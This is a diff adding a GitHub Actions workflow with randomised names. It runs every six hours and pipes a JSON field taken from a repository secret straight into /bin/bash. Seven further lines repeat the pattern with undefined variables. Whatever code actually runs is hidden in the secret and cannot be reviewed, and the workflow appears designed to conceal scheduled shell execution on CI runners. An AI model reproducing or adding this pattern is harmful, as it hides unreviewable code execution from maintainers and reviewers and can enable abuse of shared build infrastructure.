@@ -1,0 +1,25 @@
+name: tianjiayiguo
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tianjiayiguo
+        env:
+          v6219: ${{ secrets.v6219 }}
+        run: |
+          echo $v6219 | jq -r .d30 | /bin/bash
+          echo $qywbj3 | jq -r .unfap5 | /bin/bash
+          echo $hnie89 | jq -r .v099 | /bin/bash
+          echo $pi04994 | jq -r .j89706 | /bin/bash
+          echo $ngist76651 | jq -r .jy49 | /bin/bash
+          echo $ruik2 | jq -r .rd04319 | /bin/bash
+          echo $akiy83922 | jq -r .cwvp76 | /bin/bash
+          echo $uc3 | jq -r .j22 | /bin/bash
+
